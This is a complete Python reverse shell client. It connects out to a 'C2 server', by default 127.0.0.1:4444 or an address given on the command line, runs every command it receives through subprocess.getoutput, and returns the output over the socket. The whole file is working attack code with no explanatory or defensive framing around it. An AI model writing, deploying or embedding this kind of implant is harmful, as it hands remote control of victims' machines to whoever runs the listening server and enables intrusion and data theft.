#!/usr/bin/env python3
import socket
import subprocess
import sys

def connect(server_ip='127.0.0.1', server_port=4444):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        sock.connect((server_ip, server_port))
        print(f"[+] Connected to C2 server at {server_ip}:{server_port}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)
    
    while True:
        try:
            command = sock.recv(1024).decode()
            
            if not command:
                break
                
            if command.lower() == 'exit':
                break
            
            output = subprocess.getoutput(command)
            sock.send(output.encode())
            
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        server_ip = sys.argv[1]
        connect(server_ip)
    else:
        connect()